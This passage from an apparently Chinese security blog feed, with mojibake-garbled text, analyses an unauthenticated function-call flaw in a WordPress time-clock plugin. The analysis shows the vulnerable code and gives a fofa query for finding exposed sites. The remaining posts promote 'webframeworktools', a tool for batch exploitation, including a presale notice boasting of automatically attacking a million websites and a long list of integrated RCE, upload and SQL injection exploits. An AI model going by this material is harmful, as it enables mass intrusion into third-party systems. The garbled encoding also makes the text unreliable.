operator">/</span>threat<span class="token operator">-</span>intel<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">247e599</span>a<span class="token operator">-</span><span class="token number">74e2</span><span class="token operator">-</span><span class="token number">41d</span><span class="token number">5</span><span class="token operator">-</span>a1ba<span class="token operator">-</span><span class="token number">978</span>a807e6544<span class="token operator">?</span>source<span class="token operator">=</span>cve https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>browser<span class="token operator">/</span>time<span class="token operator">-</span>clock<span class="token operator">/</span>tags<span class="token operator">/</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token operator">/</span>includes<span class="token operator">/</span>admin<span class="token operator">/</span>ajax_functions_admin<span class="token punctuation">.</span>php#L58 https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>changeset<span class="token operator">/</span><span class="token number">3171046</span><span class="token operator">/</span>time<span class="token operator">-</span>clock#file40 </code></pre><p>æˆ‘ä»¬å‘ç°time-clock çš„1.2.2ç‰ˆæœ¬çš„58è¡Œå­˜åœ¨æ¼æ´æˆªå›¾å¦‚ä¸‹:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041611473.jpg" alt="æ¼æ´ä»£ç "></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// load function</span><span class="token keyword">function</span> <span class="token function-definition function">etimeclockwp_load_function_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token function">sanitize_text_field</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//å¯¹ä¼ å…¥å‚æ•°è¿›è¡Œè¿‡æ»¤é™¤äº†å­—æ¯æ•°å­—ä»¥å¤–è¿‡æ»¤</span><span class="token comment">// only run function is it exists</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">wp_die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_nopriv_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>æ ¸å¿ƒä»£ç å°±æ˜¯å¦‚æœè¿™ä¸ªå‡½æ•°åç§°å­˜åœ¨é‚£ä¹ˆä½¿ç”¨call_user_func è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚æ‰€ä»¥æ¼æ´å°±çŸ¥é“äº†è¿™ä¸ªæ¼æ´å¯ä»¥è°ƒç”¨wordpressé‡Œé¢å†™çš„æ‰€æœ‰å‡½æ•°ã€‚æˆ‘ä»¬çœ‹æ²¡æœ‰ä¼ å‚æ•°çš„åœ°æ–¹æ‰€ä»¥ã€‚è¿™ä¸ªæ¼æ´å¿…é¡»é…åˆwordpres é‡Œé¢çš„æŸäº›å‡½æ•°æ‰èƒ½åˆ©ç”¨æˆåŠŸã€‚æˆ‘ä»¬åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªç¯å¢ƒçœ‹çœ‹ã€‚å‡å¦‚æœ¬åœ°æœ‰ä¸ªtestokå‡½æ•°ä»£ç å¦‚ä¸‹:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// only run function is it exists</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"no function!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">testok</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨è¿™ä¸ªå‡½æ•°å¹¶ä¸”ä¼ å…¥å‚æ•°è¿›è¡Œåˆ©ç”¨</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041620169.jpg" alt="æµ‹è¯•ä»£ç "><br>å¦å¤–æˆ‘ä»¬çœ‹ 1.2.3 ä¿®å¤æ¼æ´æ–¹å¼ç›´æ¥åˆ é™¤æ¼æ´ä»£ç ã€‚ å¯¹æ¯”ä¸€ä¸‹åˆ é™¤äº†æ¼æ´ä»£ç å¦‚ä¸‹å›¾:<br><a href="https://plugins.trac.wordpress.org/changeset?old_path=/time-clock/tags/1.2.2&amp;old=3181069&amp;new_path=/time-clock/tags/1.2.3&amp;new=3181069&amp;sfp_email=&amp;sfph_mail=">https://plugins.trac.wordpress.org/changeset?old_path=%2Ftime-clock%2Ftags%2F1.2.2&amp;old=3181069&amp;new_path=%2Ftime-clock%2Ftags%2F1.2.3&amp;new=3181069&amp;sfp_email=&amp;sfph_mail=</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041627165.png" alt="çº¢è‰²è¡¨ç¤ºåˆ é™¤"><br>åˆ é™¤æ¼æ´ä»£ç <br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041628243.jpg" alt="1.2.3åˆ é™¤æ¼æ´ä»£ç "></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç»¼ä¸Šæ‰€è¿°æ”¹æ¼æ´éœ€è¦é…åˆwpå…¶ä»–å‡½æ•°æ–¹å¯åˆ©ç”¨ã€‚å¹¶ä¸èƒ½ç›´æ¥åˆ©ç”¨ã€‚ç›´æ¥å¯ç”¨å¯ä»¥æ‰“çš„phpinfoã€‚fofa:â€wp-content&#x2F;plugins&#x2F;time-clock&#x2F;â€œ<br>å¦å¤–èµ„äº§ä¹Ÿä¸å¤šã€‚å·¥å…·é›†æˆä¸€ä¸‹å½“pocç”¨å§ã€‚ã€‚<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041622267.jpg" alt="fofa"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools dllæ¨¡å¼ç®€å•æ‰¹é‡ä½¿ç”¨</title>
      <link href="/securitytools/2024/10/articles/039303a532fb37a7/"/>
      <url>/securitytools/2024/10/articles/039303a532fb37a7/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> å¤§å®¶åœ¨çœ‹æŸäº›å°å¯†åœˆæˆ–è€…githubæŸäº›æ¼æ´æœ‰expæˆ‘ä»¬éœ€è¦æ‰¹é‡åˆ©ç”¨ä¸æƒ³å†™nucleiå’Œxrayè¿™äº›ä¸œè¥¿ã€‚å¦‚ä½•ä½¿ç”¨webframeworktools dllæ¨¡å¼è¿›è¡Œæ‰¹é‡åˆ©ç”¨ã€‚æˆ‘ä»¬æ¥çœ‹ä»æŸå°å¯†åœˆè·å–åˆ°çš„exp pocã€‚é€šè¿‡æµ‹ç»˜å·¥å…·æ‰¹é‡å¯¼å‡ºæ¼æ´ç½‘ç«™ã€‚å‡†å¤‡å¥½æ‰¹é‡url dllurl.txt ã€‚ç”±äºæˆ‘ä»¬æ²¡æœ‰æ¼æ´ç½‘ç«™æ‰€ä»¥éœ€è¦æ‰“å¼€å·¥å…· UserDllpluginExpGenerate.exe ç”Ÿæˆåˆ©ç”¨å·¥å…·ã€‚</p><h2 id="æ¼æ´ç‰¹å¾"><a href="#æ¼æ´ç‰¹å¾" class="headerlink" title="æ¼æ´ç‰¹å¾"></a>æ¼æ´ç‰¹å¾</h2><p> æ­¤æ¼æ´æ¥å£ä¸ºxxx&#x2F;reg.phpã€‚å¹¶ä¸”æºç ä¸­æœ‰passwordå…³é”®å­—å’Œnot foundå…³é”®å­—æˆ‘ä»¬é€šè¿‡å·¥å…·ç”Ÿæˆã€‚å¦‚ä¸‹å›¾: ä¸»è¦ç”±äºæ²¡æœ‰æ¼æ´ç½‘ç«™å¹¶ä¸ä¼šæ˜¾ç¤ºç»“æœã€‚ç”Ÿæˆdllå¹¶ä¸”åŠ è½½è¿›è¡Œæ‰¹é‡åˆ©ç”¨ã€‚å¦‚ä¸‹å›¾åˆ©ç”¨æˆåŠŸå¹¶ä¸”ç»“æœå†™å…¥åˆ°txtä¸­ã€‚<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202410141718420.jpg" alt="ç”Ÿæˆå¦‚ä¸‹å›¾å¹¶ä¸”åˆ©ç”¨"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p> å¤šç»ƒä¹ å·¥å…·,ç›¸æ¯”äºå†™xrayå’Œnucleiç®€å•å¤ªå¤šäº†ã€‚å¦å¤–æœ€å¥½æ˜¯ä¼šç‚¹ä»£ç å®¡è®¡è¯­è¨€æ•ˆæœæ›´ä½³ã€‚ä»Šå¤©å°±è¯´åˆ°è¿™é‡Œã€‚åç»­ä¼šç»§ç»­å‡ºç‚¹å·¥å…·å®æˆ˜ä½¿ç”¨æ•™ç¨‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äº2025å¹´é¢„å”®webframeworkToolsæºä»£ç å…¬å‘Š</title>
      <link href="/securitytools/2024/09/articles/f76f746f1b80cfc9/"/>
      <url>/securitytools/2024/09/articles/f76f746f1b80cfc9/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p> webframeworkTools å·¥å…·è‡ª2021å¹´å¼€å§‹å¼€å‘å·²ç»ç»å†äº†3ä¸ªå¹´å¤´ã€‚æœŸé—´å¤§å®¶ä½¿ç”¨çš„è§‰å¾—ä¸é”™ã€‚è¯´urlæ¡æ•°å¤ªå°‘ã€‚ç”±äºå›½å†…å¤§ç¯å¢ƒæ‰€ä»¥æˆ‘ä»¬å¼€æ”¾çš„urlæ¡æ•°æ¯”è¾ƒå°‘ã€‚åœ¨tgç¾¤æœ‰äººæå‡ºä»˜è´¹è´­ä¹°ä½†æ˜¯ç”±äº2024å¹´æ¯”è¾ƒå¿™ã€‚æœªèƒ½å¼€å¯ä»˜è´¹æˆ‘ä»¬å·²ç»å‘å¸ƒäº†urlä¸º10wæ¡çš„è½¯ä»¶æµ‹è¯•ç‰ˆæœ¬ exp æ›´æ–°åˆ°2024-08-26 expæ¡†æ¶æ›´æ–°åœ¨2023å¹´11æœˆä»½ã€‚è¯·åˆ°åšå®¢ä¸­è‡ªè¡Œå¯»æ‰¾ä¸‹è½½åœ°å€ã€‚</p><h2 id="è½¯ä»¶100ä¸‡æ¡urlå®æˆ˜å…¨æ¨¡å—æµ‹è¯•"><a href="#è½¯ä»¶100ä¸‡æ¡urlå®æˆ˜å…¨æ¨¡å—æµ‹è¯•" class="headerlink" title="è½¯ä»¶100ä¸‡æ¡urlå®æˆ˜å…¨æ¨¡å—æµ‹è¯•"></a>è½¯ä»¶100ä¸‡æ¡urlå®æˆ˜å…¨æ¨¡å—æµ‹è¯•</h2><p> æˆ‘ä»¬å·²ç»å†…æµ‹äº†åœ¨100ä¸‡æ¡urlå…¨æ¨¡å—æµ‹è¯•ä¸‹è½¯ä»¶è¡¨ç°å¦‚ä¸‹å›¾:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061722641.jpg" alt="è½¯ä»¶å†…æµ‹100ä¸‡æ¡urlè¡¨ç°"><br>æµ‹è¯•è¯¦æƒ…å¦‚ä¸‹:<br>æµ‹è¯•ç»“æŸæ—¥æœŸ2024-06-14 ç»“æŸæ—¶é—´ 14:00<br>æµ‹è¯•ç½‘ç«™æ¡æ•°100ä¸‡æ¡<br>å…¨æ¨¡å—è€—æ—¶6å¤©6å¤œ<br>å ªç§°å®Œç¾æµ‹è¯•ã€‚æµ‹è¯•æ€»æµé‡434 GBã€‚è¿™æ ‡å¿—ç€æˆ‘ä»¬è½¯ä»¶åœ¨100ä¸‡ç½‘ç«™çš„urlä¸‹è¡¨ç°å¾ˆå®Œç¾ã€‚å®šæœ€å¤§urlæ¡æ•°100ä¸‡æ¡ã€‚æ¥ä¸‹æ¥ä¼šå¯¹æ¼æ´è¿›è¡Œä¼˜åŒ–é¿å…å‡ºç°è¯¯æŠ¥æƒ…å†µã€‚ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ğŸ˜ã€‚æ¥ä¸‹æ¥è°ƒæ•´å®Œæ¯•ååœ¨è¿›è¡Œä¸€æ¬¡æµ‹è¯•ã€‚ç„¶åä»¥åæˆ‘ä»¬å°†ä¸“æ³¨æ¼æ´æ¼æ´è¶Šå¤šè¶Šå¥½ã€‚å› ä¸ºæ•°é‡ä¸Šå·²ç»è¶³å¤Ÿäº†æˆ‘ä»¬æœ€èµ·ç å¯ä»¥è‡ªåŠ¨åŒ–æ”»å‡»100ä¸‡ä¸ªç½‘ç«™ã€‚ã€‚æµ‹è¯•è¯¦ç»†å‚æ•°<br>æµ‹è¯•cpu Intel(R) Xeon(R) CPU E5-2620 0 @ 2.00GHz (2ä¸ªå¤„ç†å™¨)<br>æœåŠ¡å™¨ windows Server 2019 Standard<br>æ“ä½œç³»ç»Ÿ:64ä½æ“ä½œç³»ç»Ÿ,åŸºäºx64 çš„å¤„ç†å™¨<br>å†…å­˜:64.0GB(63.8 GBå¯ç”¨)<br>ä¸‹è½½é€Ÿåº¦:1-2MB&#x2F;s æˆ‘ä»¬æ˜¯ç”¨äº‹å®è¯´è¯ä»æ¥ä¸è¯´æˆ‘ä»¬çš„è½¯ä»¶ç‰›é€¼ã€‚å¸‚é¢ä¸Šå¯ä»¥æ‰¿è½½ç™¾ä¸‡urlä¸å¥”æºƒçš„å°‘ä¹‹åˆå°‘ã€‚æ‰€ä»¥åç»­æ˜¯é›†æˆè¶Šæ¥è¶Šå¤šæ¼æ´ã€‚ä¸€ä½“åŒ–æ‰¹é‡å…¨çƒã€‚æ‰¹é‡å…¨çƒæˆ‘ä»¬æ˜¯è®¤çœŸçš„ã€‚ç°åœ¨ç¼ºçš„å°±æ˜¯æ¼æ´å’Œæ—¶é—´æ›´å¤šçš„æ˜¯ç¼ºæ—¶é—´å“ˆå“ˆå“ˆ<br><br/><br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„è½¯ä»¶æœ€å¤§å¯ä»¥æ­è½½100ä¸‡æ¡urlè¿›è¡Œå…¨æ¨¡å—è‡ªåŠ¨åŒ–æ”»å‡»ã€‚å¹¶ä¸”é€Ÿåº¦ä¹Ÿå¾ˆå¿«ã€‚<br>æºä»£ç æˆªå›¾:<br>é¢„å”®æºä»£ç æˆªå›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061729585.png" alt="æºä»£ç 1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061729307.png" alt="æºä»£ç 2"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061730582.png" alt="æºä»£ç 3"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…³äºè½¯ä»¶æˆ‘å°±ä¸å¤šä»‹ç»äº†å¯ä»¥çœ‹åšå®¢æˆ–è€…githubçš„ä»‹ç»ã€‚å¦å¤–ç»å¤§å¤šæ•°bugå·²ç»ä¿®å¤å®Œæ¯•ã€‚ä¿—è¯è¯´æˆäººé±¼ä¸å¦‚æˆäººä»¥æ¸”ã€‚æˆ‘ä»¬2025å¹´æ‰“ç®—æˆäººä»¥æ¸”ã€‚å°†å¼€å¯webframeworktoolsæºä»£ç é¢„å”®ã€‚ç›®å‰è®¡åˆ’æœ€å¤§é¢„å”®å¥—æ•°ä¸º50å¥—ã€‚å…¶ä¸­åŒ…å«2å¥—æºä»£ç ä¸€å¥—æ˜¯æµ‹è¯•expçš„ä»£ç ã€‚å¦å¤–ä¸€å¥—æ˜¯æ­è½½expçš„ä»£ç ä¹Ÿå°±æ˜¯webframeworkTools V5.3 å‘å¸ƒç‰ˆæœ¬ã€‚å¦å¤–è´­ä¹°ä»£ç çš„éœ€è¦ä¼šæ¸—é€æµ‹è¯•,èƒ½çœ‹æ‡‚httpæŠ¥æ–‡è¿™ä¸ªä¸ä¼šçš„è¯åç»­æˆ‘ä»¬ä½†æ˜¯å¯ä»¥ç»™ä½ è¯´è¯´ã€‚æ¸—é€æµ‹è¯•è¿™ä¸ªå¿…é¡»ä½ ä»¬è‡ªå·±å¾—ä¼šã€‚æ¯•ç«Ÿ2024å¹´äº†ä¸ä¼šç¼–ç¨‹ä¹Ÿä¸è¡Œä½ ä»¬è¯´å‘¢ ç¬¬ä¸€:ç¼–ç¨‹è¯­è¨€å»ºè®®å­¦ä¹ c# å¦å¤–å¦‚æœæ¯”è¾ƒéš¾å­¦è§‰å¾—c#ä½ ä»¬å°±å­¦ä¹ phpè¯­è¨€ç¼–ç¨‹è¦å¿…é¡»å­¦ä¹ ã€‚ç¬¬äºŒ:å¦å¤–å¿…é¡»è¦ç†Ÿæ‚‰è½¯ä»¶ä½¿ç”¨æ–¹å¼ã€‚âš ï¸âš ï¸ä¸¤ä¸ªç¡¬æ€§æ¡ä»¶å¿…é¡»è¦è¾¾åˆ°æ‰æœ‰èµ„æ ¼è´­ä¹°âš ï¸âš ï¸ã€‚è¯¦æƒ…è¯·è§é¢‘é“ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools æ¼æ´é›†æˆå…¬å‘Šä¸€</title>
      <link href="/securitytools/2024/08/articles/f7e10f7c4ce3b984/"/>
      <url>/securitytools/2024/08/articles/f7e10f7c4ce3b984/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´æ›´æ–°æƒ…å†µ"><a href="#æ¼æ´æ›´æ–°æƒ…å†µ" class="headerlink" title="æ¼æ´æ›´æ–°æƒ…å†µ"></a>æ¼æ´æ›´æ–°æƒ…å†µ</h2><p>æ¼æ´æ›´æ–°å¦‚ä¸‹:<br/><br>  æ›´æ–°æ—¶ç©ºerpshiro ååºåˆ—åŒ–æ¼æ´ erp<br/><br> å‹ç‚¹cmsä¸Šä¼ æ¼æ´<br/><br> hospitalåå‹¤ç³»ç»Ÿä¸Šä¼ æ¼æ´  hospital<br/><br> å¤§åæ™ºæ…§å›­åŒºbitmapä¸Šä¼ æ¼æ´<br/><br> æ³›å¾®ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚æ³›å¾®ä»»æ„ç”¨æˆ·ç™»å½•ç»•è¿‡<br/><br> è”è¾¾OAä¸Šä¼ æ¼æ´(ä¸çŸ¥åoa)<br/><br> é¸¿å®‡å¤šç”¨æˆ·å•†åŸ user.php ååºåˆ—åŒ–æ¼æ´<br/><br> æ³›å¾®e-officeå‘åºåˆ—åŒ–æ¼æ´<br/><br> å¤ªé˜³èƒ½ç³»ç»ŸDataCube3(cve)<br/><br> wordpress ticket æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> wordpress booking ä»£ç æ‰§è¡Œ<br/><br> è“å‡Œæ™ºæ…§ååŒå¹³å°eis æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> å¯è§†åŒ–èåˆæŒ‡æŒ¥è°ƒåº¦å¹³å°ä¸Šä¼ æ¼æ´<br/><br> JeeSpringCloud uploadFile.jsp æ–‡ä»¶ä¸Šä¼ <br/><br> ç”¨å‹U8 cloud servicedispatcher ååºåˆ—åŒ–rceæ¼æ´ yongyouu8<br/><br> ç”¨å‹GRP-U8 operOriztion SQLæ³¨å…¥æ¼æ´<br/><br> ç”¨å‹GRP-U8 fastjson æ¼æ´<br/><br> å¯Œé€šå¤©ä¸‹å¤–è´¸ERPä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> æ™®å…ƒeos ååºåˆ—åŒ–æ¼æ´<br/><br> è¿…é¥¶ç§‘æŠ€ X2Viewç‰©è”ç½‘è®¾å¤‡å­˜åœ¨ä»»æ„ç”¨æˆ·æ·»åŠ æ¼æ´<br/><br> ä¸­æˆç§‘ä¿¡ç¥¨åŠ¡ç®¡ç†å¹³å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> é­”æ–¹ç½‘è¡¨ERPå­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> ç”µä¿¡ç½‘å…³é…ç½®ç®¡ç†ç³»ç»ŸRCE<br/><br> H5äº‘å•†åŸ-ä»»æ„æ–‡ä»¶ä¸Šä¼ (othercms)<br/><br> çº¢æµ·ä»»æ„æ–‡ä»¶ä¸Šä¼ (othersystem)<br/><br> å¾®æ“ç³»ç»Ÿ-ä»»æ„æ–‡ä»¶ä¸Šä¼ -AccountEdit(ç«™å¾ˆå°‘æ²¡å•¥ç”¨å®¹æ˜“ä¿®æ”¹é…ç½® æœªé›†æˆ)<br/><br> å¾®å¦åœ¨çº¿å­¦ä¹ å¹³å°OrganSetupå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´(å¯èƒ½ä¼šè§¦å‘é—®é¢˜æœªé›†æˆ)<br/><br> åˆ†è¯Šå«å·ç³»ç»Ÿä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´(åŒ»é™¢)<br/><br> æ³›å¾®e-cology OA action.jsp æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> ç”³æ¬§å½•éŸ³ç³»ç»Ÿrceæ¼æ´<br/><br> wordpress CVE-2024-5084 ä¸Šä¼ æ¼æ´<br/><br> ä¸‡æˆ·ezEip ä¸Šä¼ æ¼æ´,ååºåˆ—åŒ–æ¼æ´<br/><br> LyLme Spageä¸Šä¼ æ¼æ´<br/><br> æ³›å¾®OA-E-Mobileç§»åŠ¨ç®¡ç†å¹³å°lang2sqlä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> è¿ˆæ™®å¤šå‘½ä»¤æ‰§è¡Œæ¼æ´<br/><br> äº‘åŒ£å­å ¡å’æœº fastjsonæ¼æ´<br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  applyAutoLoginTicketä»»æ„ä»£ç æ‰§è¡Œ    <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  applyCTä»»æ„ä»£ç æ‰§è¡Œ    <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  config-propertiesä¿¡æ¯æ³„éœ²    <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  envä¿¡æ¯æ³„éœ²    <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  findä¿¡æ¯æ³„éœ²    <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  keepAliveä»»æ„ä»£ç æ‰§è¡Œ      <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  sessionä»»æ„ä»£ç æ‰§è¡Œ       <br/><br>Hikvisionç»¼åˆå®‰é˜²ç®¡ç†å¹³å°  env_heapdumpä¿¡æ¯æ³„éœ²    <br/><br>CVE-2024-4577 php cgi è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br/><br>CVE-2024-23692 HFS è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br/><br>è¯¾äº¤å•å¯¹æ¥å¹³å°sqlæ³¨å…¥<br/><br>æ–°å¢tp5 å†…ç½®ä¸‰ç§å¸¸ç”¨getshellæ–¹å¼ã€‚ç”±äºæ—¥å¿—æ–¹å¼è¿™ä¸ªæ¯”è¾ƒå¤æ‚å°†ä¼šåœ¨è¿™ä¸‰ç§æ–¹å¼éƒ½ä¸ç®¡ç”¨çš„æƒ…å†µä¸‹ä½¿ç”¨æ—¥å¿—æ–¹å¼æ‰‹å·¥getshellã€‚<br/><br> yzmcms rceæ¼æ´<br/><br> å’Œä¸°å±±æµ·-æ•°å­—æ ‡ç‰Œ ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> Chatgpt ai å¼±å£ä»¤<br/><br> NetMizer RCE<br/><br> X-NAS&#x2F;Main RCEæ¼æ´<br/><br> pyq ä¸Šä¼ æ¼æ´<br/><br> æéªŒxxä»»æ„æ–‡ä»¶è¯»å–æ¼æ´<br/><br> çŸ­è§†é¢‘ç³»ç»Ÿæ¼æ´<br/><br> geoserver è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br/><br> ZXUi æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> jxå½©ç¥¨æ¼æ´<br/><br> h*yå‘å¡å¹³å°æ¼æ´<br/><br> jy cat ç³»ç»Ÿä¸Šä¼ æ¼æ´<br/><br> qt äº¤æ˜“æ‰€æ¼æ´<br/><br> 3g shop æ¼æ´<br/><br> jeecgbootæ¼æ´<br/><br> EKing-ç®¡ç†æ˜“ FileUploadå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> Apace OFBiz æˆæƒä¸å½“è‡´è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2024-38856)<br/><br> H3C iMCæ™ºèƒ½ç®¡ç†ä¸­å¿ƒbyod_index.xhtmlè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´<br/><br> pbootcms rceæ¼æ´<br/><br> åŒäº«äººåŠ›èµ„æºç®¡ç†ç³»ç»Ÿ-ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> èµ›è“ä¼ä¸šç®¡ç†ç³»ç»Ÿ-ä»»æ„æ–‡ä»¶ä¸Šä¼ -SubmitUploadify<br/><br> ç‘æ–¯åº·è¾¾-å¤šä¸šåŠ¡æ™ºèƒ½ç½‘å…³-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ<br/><br> å–°æ˜Ÿäº‘-æ•°å­—åŒ–é¤é¥®æœåŠ¡ç³»ç»Ÿä»»æ„ç”¨æˆ·æ·»åŠ æ¼æ´<br/><br> æ—¶ç©ºæ™ºå‹ERP-ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> Appæ‰˜ç®¡æœåŠ¡åˆ†å‘å¹³å°-ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> ç¦…é“ä»»æ„ç”¨æˆ·æ·»åŠ æ¼æ´<br/><br> é‡‘æ…§-ç»¼åˆç®¡ç†ä¿¡æ¯ç³»ç»Ÿ-SQLæ³¨å…¥<br/><br> PEPMç³»ç»Ÿå­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´<br/><br> LiveBOS ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´<br/><br> æ™ºæ…§æ ¡å›­(å®‰æ ¡æ˜“)ç®¡ç†ç³»ç»Ÿ ä»»æ„æ–‡ä»¶ä¸Šä¼ <br/><br> ä¸­å°å­¦æ™ºæ…§æ 